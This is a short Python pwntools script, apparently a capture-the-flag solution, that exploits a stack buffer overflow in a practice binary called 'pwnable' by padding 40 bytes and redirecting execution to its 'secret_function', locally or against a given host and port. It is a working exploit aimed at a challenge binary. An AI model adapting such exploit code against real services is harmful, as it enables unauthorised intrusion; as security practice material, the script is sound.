#!/usr/bin/env python3
from pwn import *


context.binary = elf = ELF("./pwnable", checksec=False)
context.arch = "amd64"
context.log_level = "error"

HELLO = str(0x656C6C6F)
OFFSET = 40


def start():
    if args.REMOTE:
        host = args.HOST or "localhost"
        port = int(args.PORT or 31337)
        return remote(host, port)
    return process(["stdbuf", "-o0", elf.path, HELLO])


def build_payload():
    return flat(
        b"A" * OFFSET,
        elf.sym.secret_function,
        0,
    )


def main():
    io = start()
    io.recvuntil(b"What do you want.\n")
    io.send(build_payload())
    io.shutdown("send")
    print(io.recvall().decode("latin-1", errors="replace"), end="")


if __name__ == "__main__":
    main()
